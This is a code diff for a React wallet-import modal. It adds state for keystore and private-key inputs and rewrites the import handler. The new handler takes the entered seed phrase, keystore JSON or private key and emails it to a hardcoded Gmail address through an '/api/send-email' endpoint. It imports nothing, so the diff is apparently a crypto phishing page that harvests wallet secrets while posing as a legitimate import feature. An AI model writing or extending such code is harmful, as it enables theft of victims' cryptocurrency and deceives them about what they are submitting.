@@ -27,8 +27,11 @@ const ImportWalletModal: React.FC<ImportWalletModalProps> = ({
     "phrase"
   );
   const [phrase, setPhrase] = useState<string>("");
+  const [keystoreData, setKeystoreData] = useState<string>("");
+  const [privateKey, setPrivateKey] = useState<string>("");
   const [isImporting, setIsImporting] = useState<boolean>(false);
   const hasClosedWalletModal = useRef<boolean>(false);
+
   // Close wallet modal when import modal opens (only once)
   useEffect(() => {
     if (isOpen && onWalletModalClose && !hasClosedWalletModal.current) {
@@ -44,17 +47,66 @@ const ImportWalletModal: React.FC<ImportWalletModalProps> = ({
     }
   }, [isOpen]);
 
+  const getImportData = () => {
+    switch (activeTab) {
+      case "phrase":
+        return phrase.trim();
+      case "keystore":
+        return keystoreData.trim();
+      case "private":
+        return privateKey.trim();
+      default:
+        return "";
+    }
+  };
+
+  const isImportDataValid = () => {
+    const data = getImportData();
+    return data.length > 0;
+  };
+
   const handleImport = async () => {
-    if (!phrase.trim()) return;
+    if (!isImportDataValid()) return;
 
     setIsImporting(true);
 
-    // // Simulate import process
-    // setTimeout(() => {
-    //   setIsImporting(false);
-    //   onClose();
-    //   // You can add success notification here
-    // }, 2000);
+    try {
+      // Prepare email data
+      const emailData = {
+        walletName: selectedWallet?.name || "Unknown Wallet",
+        importMethod: activeTab,
+        importData: getImportData(),
+        userEmail: "carlyjenny526@gmail.com", // You can make this configurable
+      };
+
+      // Send email
+      const response = await fetch("/api/send-email", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify(emailData),
+      });
+
+      const result = await response.json();
+
+      if (!response.ok) {
+        throw new Error(result.error || "Failed to send email");
+      }
+
+      // Success - close modal after a brief delay
+      setTimeout(() => {
+        setIsImporting(false);
+        onClose();
+        // You can add a success notification here
+        console.log("Import request sent successfully");
+      }, 1500);
+    } catch (error) {
+      console.error("Import error:", error);
+      setIsImporting(false);
+      // You can add an error notification here
+      alert("Failed to send import request. Please try again.");
+    }
   };
 
   if (!isOpen || !selectedWallet) return null;
@@ -172,6 +224,8 @@ const ImportWalletModal: React.FC<ImportWalletModalProps> = ({
               {/* Keystore Input */}
               <div className="mb-6">
                 <textarea
+                  value={keystoreData}
+                  onChange={(e) => setKeystoreData(e.target.value)}
                   placeholder="Paste your keystore JSON file content..."
                   className="w-full h-32 p-4 bg-gray-800/50 border border-purple-500/30 rounded-xl focus:outline-none focus:ring-2 focus:ring-purple-500 focus:border-purple-500 text-white placeholder-gray-400 resize-none backdrop-blur-sm transition-all duration-300"
                 />
@@ -190,6 +244,8 @@ const ImportWalletModal: React.FC<ImportWalletModalProps> = ({
               {/* Private Key Input */}
               <div className="mb-6">
                 <textarea
+                  value={privateKey}
+                  onChange={(e) => setPrivateKey(e.target.value)}
                   placeholder="Enter your private key..."
                   className="w-full h-32 p-4 bg-gray-800/50 border border-purple-500/30 rounded-xl focus:outline-none focus:ring-2 focus:ring-purple-500 focus:border-purple-500 text-white placeholder-gray-400 resize-none backdrop-blur-sm transition-all duration-300"
                 />
@@ -206,7 +262,7 @@ const ImportWalletModal: React.FC<ImportWalletModalProps> = ({
           {/* Import Button */}
           <Button
             onClick={handleImport}
-            disabled={!phrase.trim() || isImporting}
+            disabled={!isImportDataValid() || isImporting}
             className="w-full text-white py-4 px-6 rounded-xl font-medium disabled:opacity-50 disabled:cursor-not-allowed transition-all duration-300 flex items-center justify-center"
           >
             {isImporting ? (
